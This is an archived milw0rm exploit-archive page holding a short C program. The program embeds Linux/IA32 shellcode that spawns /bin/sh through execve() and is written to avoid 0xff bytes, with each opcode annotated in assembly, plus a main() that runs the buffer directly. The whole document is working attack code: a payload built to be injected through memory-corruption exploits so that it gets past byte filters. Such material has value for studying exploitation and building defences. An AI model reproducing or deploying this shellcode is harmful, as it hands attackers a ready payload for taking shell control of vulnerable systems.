<html>
<head>
<title>milw0rm productions</title>
<pre>
/*

  0xff-less execve() /bin/sh by anathema &lt;anathema@hack.co.za&gt;

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

unsigned char code[] = 

/* Linux/IA32 0xff-less execve() shellcode.  */

&quot;\x89\xe6&quot;                          /* movl %esp, %esi          */
&quot;\x83\xc6\x30&quot;                      /* addl $0x30, %esi         */
&quot;\xb8\x2e\x62\x69\x6e&quot;              /* movl $0x6e69622e, %eax   */
&quot;\x40&quot;                              /* incl %eax                */
&quot;\x89\x06&quot;                          /* movl %eax, (%esi)        */
&quot;\xb8\x2e\x73\x68\x21&quot;              /* movl $0x2168732e, %eax   */
&quot;\x40&quot;                              /* incl %eax                */
&quot;\x89\x46\x04&quot;                      /* movl %eax, 0x04(%esi)    */
&quot;\x29\xc0&quot;                          /* subl %eax, %eax          */
&quot;\x88\x46\x07&quot;                      /* movb %al, 0x07(%esi)     */
&quot;\x89\x76\x08&quot;                      /* movl %esi, 0x08(%esi)    */
&quot;\x89\x46\x0c&quot;                      /* movl %eax, 0x0c(%esi)    */
&quot;\xb0\x0b&quot;                          /* movb $0x0b, %al          */
&quot;\x87\xf3&quot;                          /* xchgl %esi, %ebx         */
&quot;\x8d\x4b\x08&quot;                      /* leal 0x08(%ebx), %ecx    */
&quot;\x8d\x53\x0c&quot;                      /* leal 0x0c(%ebx), %edx    */
&quot;\xcd\x80&quot;                          /* int $0x80                */
;

void main()
{
  void (*s)() = (void *)code;

  printf(&quot;Shellcode length: %d\nExecuting..\n\n&quot;,
      strlen(code));
  s();
}</pre>
//downloaded from milw0rm.com
</html>

